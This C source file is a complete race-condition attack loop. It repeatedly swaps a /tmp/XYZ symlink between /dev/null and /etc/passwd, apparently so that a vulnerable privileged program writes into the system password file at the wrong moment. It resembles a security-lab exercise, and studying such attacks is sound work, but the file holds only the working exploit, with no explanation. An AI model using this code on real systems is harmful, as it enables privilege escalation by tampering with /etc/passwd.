#include <unistd.h>

int main()
{
    while (1) {
        unlink("/tmp/XYZ");
        symlink("/dev/null", "/tmp/XYZ"); // link /tmp/XYZ to /dev/null
        usleep(1000);

        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XYZ"); // link /tmp/XYZ to /etc/passwd
        usleep(1000);       
    }

    return 0;
}
